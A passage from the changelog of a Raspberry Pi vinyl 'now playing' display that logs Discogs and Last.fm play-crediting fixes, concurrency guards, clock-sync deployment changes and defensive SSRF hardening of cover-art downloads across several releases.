  three pipeline legs, so nothing awaited it. A SIGTERM or ESC a second or two
  after a needle-lift let `asyncio.run` cancel it mid-write — `increment_play_count`
  had run but `update_last_played` and the Last.fm love had not, and because
  `_finalize_session` latches `credited` before the first await, nothing retried
  it: the collection was left permanently half-updated, silently. `ListenTracker`
  gained a bounded `drain()` that `run_pipeline` now awaits in its `finally`
  (before stopping capture/display, and even when a leg faulted), so an in-flight
  credit finishes. Bounded by `_SHUTDOWN_DRAIN_SECONDS` (10s) so a stuck write
  can't hang shutdown past systemd's stop timeout.
- **A duplicated Discogs position string no longer credits a phantom play
  (META-4, #78 — HIGH).** `SideIndex.is_last_track` — the sole gate on the
  end-of-side Play Count / Last Played write — compared the current track's
  position string to the last entry's. Discogs positions are community-edited
  free text and not guaranteed unique, so a mid-album track that merely *shared*
  the closer's position string ("B2") was flagged the last track and credited a
  play for a side that never finished. `is_last_track` is now derived from the
  already-computed, position-AND-title-disambiguated `global_index`, so only the
  genuine final entry credits. The deliberately conservative reprise behavior (a
  closer whose title is duplicated earlier resolves to the first occurrence and
  is *not* credited — a missed play rather than a phantom one) is preserved; a
  20,000-tracklist differential fuzz confirmed the change only ever removes
  phantoms, never flips a correct result.
- **A queue-lagged audio chunk no longer commits a dead track into a fresh
  session (PCONC-1, #80 — HIGH).** The epoch guard sampled the session token at
  `TrackCommitService.commit` *entry* — after the audio was captured, queued, and
  confirmed. A chunk captured while a record played can sit in the recognition
  queue (maxsize 5) past a needle-lift (`clear()` bumps the epoch); once a new
  session begins it is dequeued, confirmed, and committed — and the entry-time
  sample reads the *new* epoch, finds it stable across the resolve, and writes the
  previous record's track onto the screen and, downstream, into the Discogs
  collection. The epoch is now bound to the audio at `enqueue` (≈ capture) time,
  travels with the chunk through recognition, and is passed to `commit` as a
  required `audio_epoch`; a commit whose audio predates the live session is
  discarded. This closes the queue-lag window the mid-resolve guard (B-1) never
  covered, while preserving the mid-resolve (B-1) and tracker-tail (B-19) checks
  exactly — all three now validate against the audio's own epoch rather than a
  commit-time re-sample. Reproduced RED at the commit boundary; the epoch
  threading is mutation-verified (a dequeue-time re-read, a dropped epoch, a
  constant-epoch enqueue, and a re-sample-at-entry mutant are all killed).
- **The systemd unit now waits for a synced clock and an up network before
  starting (CRIT-4, #83 — the root cause behind the unset-clock date
  corruption).** The documented `vinyl-now-playing.service` ordered only on
  `network.target` (the network stack is *configured*, not up) with nothing
  waiting on the clock. The Pi has no battery-backed RTC, so the app could start
  with a stale `fake-hwclock` time and stamp wrong **Last Played** dates into the
  Discogs collection before `systemd-timesyncd` synced over the network. The unit
  now orders `After=network-online.target time-sync.target graphical.target` with
  `Wants=network-online.target`, and `docs/pi-setup-guide.md` adds the two steps
  that give that ordering teeth: enabling `systemd-time-wait-sync.service`
  (without it, `time-sync.target` can be reached *before* the clock is set — a
  documented systemd behavior with plain `timesyncd`) and setting the timezone
  via raspi-config (covers VNEW-1). This is the deployment-side root-cause fix;
  the defensive writer-side clock gate (STAB-2, #86) is complementary and tracked
  separately.
- **A tracker exception no longer strands a confirmed track (LB-1, #84 —
  MEDIUM).** `TrackCommitService.commit` advanced the dedup key (`set_raw`)
  *before* awaiting `tracker.on_track_identified`. The B-11 ordering invariant
  guarded against a *resolver* failure but not a *tracker* one: if
  `on_track_identified` raised — its album-split path awaits a Discogs write —
  the exception propagated to `run()` while `current_raw` had already advanced,
  so the recognition loop's dedup treated the never-recorded track as "already
  playing" and never re-attempted it. The track was displayed but never tracked,
  never scrobbled, and never retried. `set_raw` now runs *after*
  `on_track_identified` succeeds, so a tracker exception leaves `current_raw`
  un-advanced and the loop re-commits on the next chunk (a transient failure
  self-heals — the track is then both tracked and scrobbled; no double-scrobble,
  since the scrobble sits after `set_raw`). Moving `set_raw` past the tracker
  await also opened a needle-lift window, so the advance now shares the same
  epoch guard as the scrobble (B-19): a SESSION_ENDED *during* the tracker call
  can't resurrect a dead session's dedup key. Reproduced RED; the reorder and the
  guard are both mutation-verified. B-11 still holds (set_track runs first).
- **Removed an unreachable duplicate-position fallback in
  `SideIndex.from_tracklist` (MUT-15, #85 — test effectiveness).** The finding
  flagged surviving mutants on the `global_index` fallback ("if two rows share a
  position string and neither matches the title, use the first position match").
  Measured rather than assumed: that branch is *provably unreachable* —
  `target_position` is always derived from a title-bearing entry, so a row
  matching BOTH the position and the title always exists and the loop never falls
  through (a differential fuzz of ~1.9M cases plus 1M reachability probes found 0
  fall-throughs and 0 behavior differences vs. the old code). The three surviving
  mutants were therefore *equivalent* — they only mutated a variable nothing
  consumed — and unkillable by any test. So instead of testing an impossible
  state (the finding's literal suggestion), the dead fallback was removed,
  eliminating those mutants at the source, and the *reachable* duplicate-position
  behavior (resolve by position AND title, not the first row at that position) is
  now pinned by a real test. Behavior-preserving; no production behavior change.
- **A pre-NTP clock no longer stamps a wrong Last Played date or scrobble
  timestamp over real data (STAB-2, #86 — MEDIUM).** The Pi has no RTC; a boot
  before NTP settles reads the Unix epoch or a stale `fake-hwclock` date.
  `update_last_played` wrote `date.today().isoformat()` as an absolute set with no
  clock check, so a pre-NTP side-completion POSTed e.g. `1970-01-01` over the
  correct Last Played value in the real collection (and logged success), and the
  scrobble submitted an epoch/stale timestamp that Last.fm silently drops or
  mis-places. A new `src/util/clock.py` gate (`clock_is_trustworthy`, a
  compiled-in 2026-01-01 floor) now guards both date-dependent writes: a pre-NTP
  boot skips the Last Played write and the scrobble with a WARNING rather than
  writing a wrong value, and re-attempts on the next play once the clock syncs.
  Play Count is deliberately NOT gated — it writes a count, not a date, so a wrong
  clock can't corrupt it. This is the code-level complement to the
  deployment-level CRIT-4 (#83): the systemd unit already waits for
  `time-sync.target`, so a correctly-deployed appliance never runs before sync;
  this gate is defense-in-depth for the manual-run / mis-deployed case and the
  catastrophic epoch reading. (The floor is a lower bound — a stale-but-post-floor
  clock is a documented residual the deployment sync covers.) A deliberate
  clock-skip is not mislabeled as a failure by the tracker's finalize log.
  RED-reproduced (a 1970 POST over the real field); the gate and both call-site
  guards are mutation-verified; cold review + a narrow second pass both PASS.
- **A stale commit no longer resurrects a dead session as a phantom (CONC-6, #87
  — LOW).** The commit epoch guard covered the resolve await but not the
  `on_track_identified` await. That await can park on the tracker's contended
  `_lifecycle_lock` (a previous session's Discogs write holds it); a SESSION_ENDED
  landing in that window ends the session and bumps the epoch, and the tracker
  would then acquire the lock, see `_session is None`, and start a PHANTOM session
  for audio that already stopped — which a later album split could phantom-credit
  (and a FALLBACK track with no release_id can't split away to clean up). `commit`
  now hands `on_track_identified` a staleness predicate
  (`is_stale=lambda: state.session_epoch != audio_epoch`, using PCONC-1's
  audio-bound epoch); the tracker re-checks it *after* acquiring the lock and drops
  the stale track — starting no session, logging nothing — rather than resurrecting
  it. No false-drop: an album-swap split isn't a silence event and doesn't bump the
  epoch, so a live track is never dropped. Mutation-verified; a real-lock cold-review
  reproduction confirmed the phantom forms pre-fix and is dropped after.
- **A persistent Discogs 429 is now a distinct, loud outcome instead of a silent
  lost credit (META-10, #88 — LOW).** The transport retried a 429 once after
  sleeping the server's `Retry-After`, clamped to a 10s cap — so when Discogs
  answers `Retry-After: 60` the retry landed back inside the same throttle window
  and 429'd again, and the caller then logged a generic failure and returned
  `False`, dropping the completed side's Play Count credit with nothing to
  distinguish it from any other error. The cap stays (`request()` runs on the
  shared executor pool; a long sleep starves cover fetches / scrobbles — P-2). Now
  a `Retry-After` **beyond** the cap skips the futile retry entirely — no wasted
  sleep, no second request hammering Discogs mid-backoff — and logs a distinct,
  loud ERROR naming the lost-credit consequence; a retry that is **still** 429 logs
  the same distinct ERROR rather than a generic failure. Actually waiting out a
  long `Retry-After` so the write can still land (recovery) needs Discogs off the
  shared pool and is deferred to the dedicated executor (#61). The read path still
  returns `_READ_FAILED` on 429, so META-1's abort is unaffected, and B-15 POST
  opt-in retry semantics are preserved. Mutation-verified (incl. the `>`/`>=`
  boundary); cold review SPEC / QUALITY PASS.
- **A partial Discogs write now logs one explicit divergence line instead of two
  unrelated warnings (META-7, #89 — LOW).** The end-of-album credit is two
  independent POSTs — Play Count, then Last Played — against a 60 req/min API, and
  the session is destroyed right after. If exactly one lands (a 429 on the second
  POST is the obvious case), the collection item is left inconsistent — count
  incremented but date stale, or the reverse — with nothing to retry it until the
  record plays again. Each write already logged its own warning, but the two
  didn't say they belonged together. `_finalize_session` now emits a single
  `DIVERGED` warning naming the release/instance and stating which side landed and
  which did not, in both directions. A deliberate STAB-2 clock-skip of Last Played
  (a pre-NTP boot defers rather than fails, and has already WARNed) is excluded via
  a trustworthy-clock gate so the line does not cry wolf on every album finished
  before NTP sync; genuine post-sync failures (a 429, a dropped connection) run on
  a trustworthy clock and still fire. Log-only — no new writes to the collection.
  RED-first; both disagreement directions mutation-pinned (the XOR, the clock gate,
  and each message operand); cold review SPEC / QUALITY PASS after adding the
  reverse-direction `(F,T)` test the first pass flagged as an unpinned branch.
- **The account username is percent-encoded in every Discogs collection URL
  (SEC-7, #90 — NIT).** Every numeric id in a write path is hardened through
  `_as_id`, but the operator-authored `username` (from `config.yaml`) was
  interpolated raw into all five `/users/{username}/collection…` paths — four in
  the writer (increment POST, Last Played POST, fields GET, field-value read GET)
  and one in the reader's collection index. A username containing a URL-reserved
  character — `/`, `?`, `#`, a space — silently reshaped the request path (extra
  segments, a stray query string, a fragment) rather than failing. Both classes
  now compute `quote(username, safe="")` once at construction and use that single
  encoded segment at every URL site; `self.username` stays raw for
  identity/logging. Not an attack surface (the value is operator-authored) — a
  robustness fix — and it incidentally tightens log hygiene: `_redact_url` masks
  the encoded username as one segment, whereas a raw `a/b…` previously leaked the
  `b` as a separate, unmasked path segment. RED-first; all five sites plus the
  encode and the `safe=""` parameter mutation-pinned; cold review SPEC / QUALITY PASS.
- **Discogs blocking calls run on a dedicated executor, isolated from cover art
  and Last.fm (#61 — MEDIUM).** Every Discogs reader/writer call — and the 429
  backoff `time.sleep()` inside `request()` — used to run on the SHARED default
  `run_in_executor(None, …)` pool that also serves cover downloads and Last.fm
  scrobbles/loves, so a rate-limit sleep parked a worker those tasks needed (P-2,
  which capped the backoff at 10s as an interim mitigation). `DiscogsHttp` now
  owns a bounded `ThreadPoolExecutor(max_workers=2, thread_name_prefix="discogs")`
  and an async `run()` helper; the reader and writer expose thin `run()`
  delegates, and the resolver's collection/database searches and the tracker's
  Play Count / Last Played writes dispatch through them. Cover art and Last.fm
  deliberately STAY on the default pool. The composition root passes the shared
  `DiscogsHttp` to `run_pipeline`, whose shutdown `finally` closes the executor
  LAST — after the in-flight credit writes have drained off it (`wait=False`, so
  it never hangs shutdown). Re-rated MEDIUM and pulled into Wave 1 because the
  429 path has data-integrity consequences (META-1 / META-10); actually waiting
  out a long `Retry-After` (raising the now-unjustified 10s cap) is a follow-up
  this isolation *enables*, not part of it, and the broader own-all-executors /
  shutdown-deadline work stays scoped to CRIT-3 (Wave 2). RED-first; all four
  dispatch sites, the dedicated-pool selection, the thread prefix, and the
  drain→close ordering are mutation-pinned; cold review SPEC / QUALITY PASS.
- **An album-split finalize no longer loses the previous record's Play Count
  credit on a transient write failure (#163 — MEDIUM).** `_finalize_session`
  latched `credited = True` BEFORE the increment await (a deliberate B-8
  double-increment guard) while the session was already detached — so if the
  Discogs write failed (a transient 500 / 429 / network drop, which
  `increment_play_count` catches and returns False), the completed play was
  marked credited, detached, and never retried. Reproduced RED-first: a fast swap
  to a new record before the silence threshold triggers the album split, which
  finalizes the previous session; the increment returns False and its play is
  silently lost. `PlaySession` now separates the "in-flight" latch (`crediting` /
  `loving`, set BEFORE the await to preserve the B-8 / B-23 re-entrancy guard)
  from the "committed" flag (`credited` / `loved`, set only AFTER the write
  lands), and the increment and the Last.fm love are each bounded-retried
  (3 attempts, 1s + 2s backoff — short so it fits the shutdown drain window and
  keeps the album-split lock-hold small). `update_last_played` stays a single
  attempt: it never had the false-latch bug (it always ran exactly once), it is
  self-correcting on the next play (META-7), and retrying it would fight the
  STAB-2 deliberate clock-skip. RED-first; commit-on-success, both in-flight
  guards, the retry bound, and early-return-on-success are mutation-pinned; cold
  review SPEC / QUALITY PASS (one LOW liveness note — the split-path retry runs
  under the lifecycle lock, structurally resolved by finalizing outside it,
  CONC-2 / #96 — documented, not data loss).

---

## [1.5.1] — 2026-06-19

**Code-review hardening, round 2 — no new user-facing features.** A second-pass
Principal-Engineer review (`CODE_REVIEW_2026-06-18.md`) produced 13 issues
(#62–#74) across five milestones, all fixed here through the same implement →
test → mutation-check → cold-review discipline. Highlights: the residual
cover-fetch DNS-rebinding SSRF is closed with an IP-pinned HTTPS fetch; the
cover fetch/disk cache is extracted into a pure `CoverArtCache` module with disk
hygiene; palette extraction and boot-arc rotation moved off / cached on the hot
path; five pipeline-correctness fixes; and two doc-vs-code gaps reconciled. The
test suite grew 545 → 632. No behavioral regressions; the one deferred follow-up
is #61 (dedicated Discogs executor), gated on real-world rate-limit evidence.

### Security

- **Cover-art fetch pins the connection to a validated IP (S-7, #62).** The
  download path previously resolved the host once to vet it, then let
  `requests` resolve it again to connect — a check-then-use (TOCTOU) window an
  attacker controlling DNS for an allow-listed host could exploit to rebind the
  second lookup to an internal address. `_validate_cover_url` now resolves each
  hop **exactly once** and returns the pinned IP; `_open_cover_stream` dials that
  exact IP via a `urllib3.HTTPSConnectionPool` while keeping TLS SNI +
  certificate verification bound to the original hostname (`server_hostname` /
  `assert_hostname`). The whole hop is rejected if **any** resolved address is
  non-public, IPv4-mapped IPv6 is normalized before classification, and
  multicast/reserved/unspecified space is now rejected (plugging an
  `is_global`-only gap where `224/4` slipped through). Redirects are
  re-validated and re-pinned per hop. The renderer no longer imports `requests`;
  `urllib3>=2.0` and `certifi` are now explicit direct dependencies.
  Mutation-audited; suite grew to ~562.

### Changed (architecture)

- **Cover-art fetch + disk cache extracted into `CoverArtCache` (A-15, #63).**
  The SSRF-hardened download, URL→disk caching, and the new disk-hygiene logic
  moved out of the 1,600-line `renderer.py` into a new, pygame-free
  `src/display/cover_cache.py` — the same God-object split A-4 did to the Discogs
  client, so the security-sensitive network boundary is now isolated and
  independently testable. The renderer holds a `CoverArtCache` and only asks it
  for paths / triggers downloads; it no longer imports `socket`, `ipaddress`,
  `urllib3`, `certifi`, or `tempfile`. It keeps the scaled-Surface cache and the
  palette transition (render-loop concerns). No behavioral change. Cover-fetch
  tests moved to `tests/test_cover_cache.py`.

### Fixed (resource hygiene)

- **Stale `.cover-*.part` tempfiles are swept on startup (R-1, #64).** A SIGKILL
  between a cover's tempfile write and its atomic rename used to strand a partial
  that nothing ever cleaned up; `CoverArtCache` now sweeps them on construction.
- **The on-disk cover cache is now bounded (R-2, #65).** Every in-memory cache
  was already bounded, but the cover directory grew without limit for the life of
  the collection. It's now an mtime-LRU cache capped by file count and total
  bytes, pruned on startup and after each download — and the prune never evicts
  the cover just written (guards an mtime-tie / coarse-SD-clock eviction race).

### Changed (performance — long-run stability)

- **Palette extraction moved off the event loop (P-9, #66).** `_queue_palette`
  runs synchronously inside `PlayerState.set_track`'s observer callback on the
  event loop, and used to decode the cover with Pillow inline (tens of ms on the
  Pi) on a cache miss — violating the Signal "listeners must not block" contract.
  It now never decodes: it targets the fallback palette on a miss, while a new
  `_extract_palette_async` decodes in an executor and re-queues the real palette.
  A "wanted cover" guard ensures a slow decode for a previous track can't paint
  its palette over the track now on screen. _Minor visible trade:_ a cover whose
  palette isn't yet in the in-memory cache (e.g. the first track after boot) now
  lerps fallback→album over one executor hop instead of appearing fully themed on
  the first frame — which is the same fallback→album transition the empty-state
  screens already use; repeat albums within a session stay instant via the cache.
- **Boot-arc rotation is cached by angle bucket (P-10, #67).** The identifying
  spinner used to call `pygame.transform.rotate` every frame for the whole
  (possibly minute-plus) wait; it now quantizes to 24 angle buckets and reuses a
  cached rotated Surface per `(radius, accent, bucket)`, mirroring the status
  dot's pulse buckets (P-3). Steady-state optimization; during the ≤1s palette
  lerp it falls back to per-frame rotation (never worse than before).

### Fixed (pipeline correctness)

- **Scrobble re-checks the session epoch before firing (B-19, #68).** Scrobbling
  still happens on confirmation (a confirmed vinyl track is genuinely playing),
  but `TrackCommitService.commit` now re-checks `session_epoch` before the
  scrobble — `on_track_identified` can yield (its album-split path awaits a
  Discogs write), and a needle-lift during that window must not scrobble a track
  whose session has already ended. The display commit, which has no intervening
  await, is unaffected.
- **Recognition-churn telemetry (B-21, #70).** When recognition keeps returning
  different one-off matches that never reach confirmation (two records bleeding,
  a noisy room), the display correctly doesn't guess — but it used to do so
  silently. A churn counter now logs a warning every few unconfirmable results so
  a "stopped updating" report has a journal breadcrumb. No change to the
  conservative consecutive-confirmation behavior.
- **Static-frame cache key no longer keys on `id(cover)` (B-22, #71).** Python
  object ids are recycled after GC, so a freshly-loaded cover Surface could
  reuse a collected one's id and falsely match a stale composed frame. The key
  now includes a monotonic `_cover_version` bumped whenever a cover lands, so a
  newly-downloaded cover reliably forces a recompose.
- **Last.fm love can't double-fire (B-23, #72).** `PlaySession` gains a `loved`
  flag (latched before the love await), mirroring the `credited` guard. Needed
  because a fallback album (no release_id) never latches `credited`, so the
  existing guard didn't cover the love path; a re-entrant finalize could
  otherwise love the closer twice.

### Documented (no behavior change)

- **Lock-free session start proven race-free (B-20, #69).** Analysis showed the
  synchronous `_start_session` called from `on_silence_event(MUSIC_STARTED)` is
  not a reproducible race on the single-threaded event loop (create-only,
  idempotent, no await; the session-destroy site has no await before the null;
  the one lock-held-across-await path adopts rather than clobbers). The invariant
  is now documented in `_start_session` and locked down by a regression test,
  rather than restructured (routing the sync start through the lock would need
  scheduling, breaking the synchronous-session contract and adding a
  SESSION_ENDED ordering hazard for no real safety gain).

### Documented / tests (aspirational debt)

- **Hue-Diversity Rule deliberately deferred, docs reconciled (D-1, #73).** The
  ≥60° OKLCH cross-album accent separation was a prototype-only design
  exploration the docs still framed as "aspirational / not yet implemented"
  (implying pending). It is now recorded as **deliberately deferred — not a
  production feature**: the production `accent` stays the authentic
  most-saturated cover color, in isolation. Implementing it would make the accent
  a synthetic color not in the artwork and the palette order-dependent (breaking
  the pure `url → palette` cache); revisit only if same-hue runs prove
  distracting on hardware. CLAUDE.md and DESIGN.md updated to match the shipped
  code; no code change.
- **Resolution-independence of the static layout backed by a test matrix
  (D-2, #74).** CLAUDE.md claims the renderer is resolution-independent
  (`s = min(w/1024, h/600)`, no breakpoints), but `get_now_playing_layout` was
  only ever exercised near 1024×600. A new parametrized matrix — 480×320 → 4K
  **plus non-16:9 cases (square, portrait, ultra-wide, 5:4)** that exercise the
  `sx ≠ sy` / min-dimension cover branch — asserts no negative/zero/off-screen
  rects, a square cover bound by the smaller dimension and clear of the text
  column, correct vertical flow with the title block clear of the bottom
  meta/prev-next, and font floors + hierarchy at every size. The static layout
  held across the whole matrix. _Scope:_ this covers the deterministic layout
  geometry; the renderer's runtime text-fit composition (`_compose_now_playing`'s
  dynamic title push-down/clip) is content-dependent and remains unexercised by
  these pure-geometry tests.

---

## [1.5.0] — 2026-06-19

**Code-review hardening release — no new user-facing features.** A full
Principal-Engineer review of the codebase (`CODE_REVIEW_2026-06-17.md`) produced
59 findings across six milestones — architecture, performance, correctness,
security, tests, and the design prototype — all fixed here. Every fix shipped
through the same discipline: implement → tests → mutation checks → independent
cold review. No behavioral regressions; the test suite grew to ~545 and is
mutation-audited.

> **Upgrade note:** `config.yaml` is now parsed into a typed, validated config
> at startup (see _Changed_ below). Validation is **stricter** than the old
> untyped load — a hand-edited config with loose types (e.g. `fullscreen: 1`,
> `sample_rate: 44100.0`, or a quoted number like `width: "1024"`) that used to
> run will now fail fast with one aggregated, human-readable `ConfigError`.
> The shipped `config.example.yaml` uses correct types; check yours if it was
> edited by hand.

### Changed (architecture)

- **Typed configuration boundary (A-2).** New `src/config.py`: `load_config()`
  parses + validates `config.yaml` **once** into a frozen `AppConfig` tree of
  section dataclasses (`AudioConfig`, `DiscogsConfig`, `DisplayConfig`,
  `LastFmConfig`, `RecognitionConfig`). Every component now takes its own typed
  slice instead of reaching into an untyped dict, and a missing/misspelled key
  is one friendly `ConfigError` at startup rather than a deep `KeyError`.
- **`DiscogsClient` God object split into a package (A-4).** `src/metadata/discogs/`
  now holds three single-purpose collaborators: `DiscogsHttp` (`transport.py` —
  the shared authenticated session + rate-limit-aware `request()`), `DiscogsReader`
  (`reader.py` — collection/database search, tracklist, original-year,
  result assembly), and `DiscogsCollectionWriter` (`writer.py` — Play Count and
  Last Played writes). `main.py` is the composition root: one shared transport,
  reader → resolver, writer → tracker — each depends only on the half it uses.
  The old `src/metadata/discogs_client.py` is removed.
- **Application-layer commit coordinator (A-9).** The resolve → state → track →
  scrobble sequence moved out of the audio layer into
  `src/app/track_commit_service.py` (`TrackCommitService.commit`). `RecognitionLoop`
  now simply confirms a `RawRecognitionResult` and hands it to an injected
  `on_confirmed` callback; it no longer knows about the resolver, tracker, or
  Last.fm. The B-1 epoch guard and B-11 ordering are preserved exactly.
- **Thin `TrackMetadata` + `SideIndex` value object (A-5).** All positional facts
  (track number, side letter/position/total, prev/next, is-last-track) are now
  computed once by `SideIndex.from_tracklist(...)` and cached, instead of each
  property re-scanning the tracklist by title on every access.
- **Palette extraction relocated (A-8).** Cover-art palette extraction and the
  WCAG colour science (`extract_palette`, `ensure_contrast`, `contrast_ratio`,
  `relative_luminance`, `validate_image_file`) moved from the pygame renderer to
  `src/display/palette.py`; the renderer now consumes already-valid palettes.
  `extract_palette` guarantees the Full-Opacity Rule (muted ≥ 4.5:1) by
  construction.
- **Enum-driven empty states (A-7).** Boot/idle/error rendering is now an
  `EmptyState` enum + a single `_EMPTY_STATES` descriptor table, replacing the
  stringly-typed `kind` argument and three parallel dicts.
- **Observer hardening (A-11/A-12).** New `src/util/signal.py` `Signal[T]` with
  log-and-continue delivery (a throwing listener can't kill delivery to the
  rest); `PlayerState` and `SilenceDetector` use it. `PlayerState` is documented
  as event-loop-thread-only.
- **Error taxonomy (A-6).** New `src/metadata/errors.py` distinguishes transient
  vs. permanent external failures (`is_transient`); the resolve boundary treats a
  transient miss as "couldn't determine" (leave the album uncached/retryable)
  rather than a false "not owned".
- **Recognition backend split (A-13).** `RecognitionLoop` recognition is split
  into `_encode_wav` (executor) / `_call_shazam` (transport, lazy import) / a
  pure `_parse_shazam` for testability.
- **Decoupling (A-3).** The tracker is injected with its Discogs dependency
  directly at the composition root rather than reaching into the resolver's
  internals (later narrowed to the write half by A-4).

### Performance

- **Session collection index (P-1).** Discogs collection search builds an
  in-memory index once per session and matches locally, replacing up to 25
  per-candidate membership GETs and a full re-walk.
- **Rate-limit back-off cap lowered 30s → 10s (P-2).** Bounds how long a 429
  back-off can park a shared executor worker. (Full isolation via a dedicated
  Discogs thread pool is deferred — tracked in #61.)
- **Renderer hot-loop caching (P-3…P-8).** Pre-rendered status-dot phases,
  quantized in-flight lerp palettes for stable per-frame cache keys, a bounded
  font cache, numpy-based palette frequency counting (also retiring the
  deprecated `Image.getdata()`), and other per-frame allocation removals.

### Fixed (correctness)

- **Play-count integrity (B-1, B-2).** A track can no longer resurrect itself
  after the needle lifts (session-epoch guard around the resolve await), and a
  fast side/record swap no longer credits the wrong album.
- **Tracklist / neighbour correctness (B-5, B-10).** Reprise titles repeated
  across sides resolve to the correct neighbour, and numbered tracklists (no
  side letter) now get prev/next.
- **Discogs robustness (B-15, B-16).** A 429 on a POST no longer blindly retries
  unless the body is an idempotent absolute-set; a numeric Play Count value is
  coerced instead of silently skipped.
- **Renderer robustness (B-12, B-17, B-18).** Degenerate covers don't crash
  palette extraction, the genre "+N" overflow reflects what actually fit, and a
  corrupt cached cover is re-fetched within the track.
- Plus the remaining correctness findings (B-7, B-9, B-11, B-14, etc.).

### Security

- Cover-art download SSRF hardening, decompression-bomb guards, write-URL ID
  coercion (S-5), and request-URL redaction in logs (S-4) (S-1…S-5).

### Tests & docs

- New suites for the new structure: `test_config.py`, `test_track_commit_service.py`,
  the Discogs `reader`/`writer`/`transport`/`security`/`split` tests, plus run-loop,
  capture drop-oldest/stop, and tracker public-path coverage. The Last.fm scrobble
  branch and `RecognitionLoop.run()` are now exercised (T-2). Async tests are
  marker-consistent and a flaky palette-retarget assertion is deterministic.
- Hardcoded test counts in docs are de-hardcoded (T-8) — run
  `pytest --collect-only -q | tail -1` for the live number.
- The manual `test_discogs_live.py` script is gated out of pytest collection (T-7).

### Design prototype

- Wired the "Show prev/next" tweak toggle and removed dead `primaryAlbumId`
  (PR-1); replaced the module-load `matchMedia` read with a live
  `useReducedMotion()` hook (PR-3); dropped a dead `transformOrigin` and
  annotated the sanctioned wildcard `postMessage` bridge (PR-5); added handoff
  notes that empty-state metadata suppression and palette guarantees come from
  `DESIGN.md` / production code, not the hand-tuned prototype (PR-2, PR-4).

---

## [1.4.2] — 2026-06-11

**Behavior-refinement release — original year over pressing year.** The
catalog footer's year now shows the album's original release year rather
than the pressing's. Surfaced by rendering the 2026 pink-vinyl reissue of
Wolf Parade's *Apologies to the Queen Mary* (2005): the display read 2026.
DESIGN.md §7 already specified "original release year" — this is the code
catching up to the spec. Test count: 334 → 341.

### Changed

- `DiscogsClient._build_result` now prefers the new
  `get_original_year()` — a rate-limited GET to `/masters/{id}` reading the
  master's year — and falls back to `release.year` (the pressing year) when
  the release has no master, the master's year is 0/unknown, or the lookup
  fails. Both Discogs tiers benefit; the MusicBrainz fallback still shows
  no year (unchanged).
- Cost: one extra Discogs API call per album resolve, amortized by the
  v1.3.3 album-level metadata cache to once per album per session, and
  routed through the v1.3.3 429-aware `_request` helper.

### Tests

- 341-test unit suite (+7 in `tests/test_discogs_client.py`):
  master-year preferred over pressing year, no-master and zero-year and
  network-failure fallbacks, lazy `.master` property raising, and
  `_build_result` end-to-end preference/fallback.

---

## [1.4.1] — 2026-06-11

**Empty states release — Phase 2, completing the v1.4.0 design
translation.** Boot, idle, and the new error state now render in the full
DirectionA frame per DESIGN.md §5, replacing the interim centered spinner
and bare gradient. Test count: 314 → 334.

### Added

- **`PlayerStatus.ERROR`** — set by `RecognitionLoop._register_miss()` after
  `recognition.error_after_misses` consecutive failed recognitions (default
  6, ≈1 minute) while LISTENING. Misses during PLAYING (routine surface
  noise) and IDLE never trigger it. Recovery: repositioning the needle
  (music restart re-enters LISTENING) or a successful commit (→ PLAYING);
  session end clears to IDLE.
- **Error screen** — static muted-red arc (`#c85050`) in the ghost ring,
  "NO MATCH FOUND" + "REPOSITION NEEDLE TO RETRY" labels, hero "Couldn't
  identify". Deliberately motionless: boot spins, error sits.
- **Boot screen** (replaces the centered spinner) — full DirectionA frame
  with ghost ring + rotating accent arc (1.4s linear, per the design's
  rotate keyframe), hero "Listening…" at 48px, and the time-progressive
  cover label: WARMING UP (0–19s) → STILL LISTENING… (20–59s) →
  IDENTIFYING… M:SS (60s+), so a hung process is distinguishable from
  active identification across the room.
- **Idle screen** (replaces the bare gradient) — 135° diagonal-stripe
  empty cover (12px surface/bg bands) with "NO RECORD ON PLATTER", hero
  "Waiting for a record". Still the minimal DESIGN.md placeholder; the
  rich idle redesign remains planned (now v1.6.0).
- New `recognition.error_after_misses` config key (default 6).

### Changed

- All empty states render on the fallback palette (lerped to smoothly from
  the last album's palette rather than jump-cutting), suppress all album
  metadata (artist, album, chips, catalog, PREV/NEXT — per DESIGN.md
  production behavior), keep the Cover Lift shadow, and show the status
  strip with state-mapped dot: boot pulses + glows in accent; idle sits
  static in muted; error sits static in red. The hero renders at 48px (the
  DESIGN.md empty-state font size exception) above the accent rule.
- `MUSIC_STARTED` now re-enters LISTENING from ERROR as well as IDLE
  (`main.py`) — the "reposition needle" recovery path.
- `_draw_header` and `_draw_status_dot` generalized (state label / dot
  color, animation, and glow are now parameters shared by the now-playing
  and empty screens).
- Idle and error frames are fully static, so the render loop goes quiet in
  those states (previously the idle screen still woke at 10 fps).

### Tests

- 334-test unit suite (+20 in `tests/test_error_state.py`): ERROR
  transitions and recovery, miss-counting rules across all states, boot
  label progression, headless compose smoke tests for all three empty
  states, and static-frame cache behavior across boot-label ticks.

---

## [1.4.0] — 2026-06-11

**Design fidelity release — Phase 1 of the DESIGN.md production
translation.** Brings the production renderer up to the full design system
spec (typography, elevation, components) defined in `DESIGN.md` and
`design/DirectionA.jsx`, plus a major render-loop optimization. Phase 2
(empty-state redesign + error state) follows separately. Test count:
297 → 314.

> **Versioning note:** the roadmap previously reserved v1.4.0 for the idle
> screen redesign; planned features then shifted up one minor version. (Further
> superseded by the v1.5.0 code-review hardening release — current plan is idle
> screen → v1.6.0, side awareness → v1.7.0, web dashboard → v1.8.0; see
> `docs/roadmap.md`.)

### Added

- **Bundled display fonts** (`src/display/assets/fonts/`, all OFL-licensed
  with license texts included): Inter Tight SemiBold (hero track), Inter
  Tight Medium (artist, adjacent track names), Newsreader Italic (album
  title), JetBrains Mono Regular (all labels/metadata). Static instances
  cut from the Google Fonts variable sources. DejaVu SysFont fallback if
  files are missing.
- **Letter-spacing for mono labels** (`_render_tracked`): SDL_ttf has no
  tracking support, so labels render per-character with CSS-equivalent em
  tracking (0.16em status strip, 0.10em chips, 0.08em catalog footer,
  0.12em PREV/NEXT). Surfaces cached in a `_BoundedCache` (cap 128).
- **Cover Lift shadow + hairline ring** (DESIGN.md §4): the design's
  defining `0 30px 60px rgba(0,0,0,0.55)` shadow, rendered via Pillow
  gaussian blur (cached per size), plus the 1px ~4%-white inset ring that
  keeps the cover edge visible against near-black backgrounds.
- **Shrink-instead-of-ellipsis everywhere** (product decision): artist
  (single line) and album (≤2 wrapped lines, per the design's 2-line clamp)
  now step their font size down via the new `_fit_wrapped()` helper instead
  of hard-clipping. The hero keeps its v1.2.1 step-down behavior. Ellipsis
  survives in exactly one sanctioned place: PREV/NEXT adjacent track names
  (`_ellipsize`).
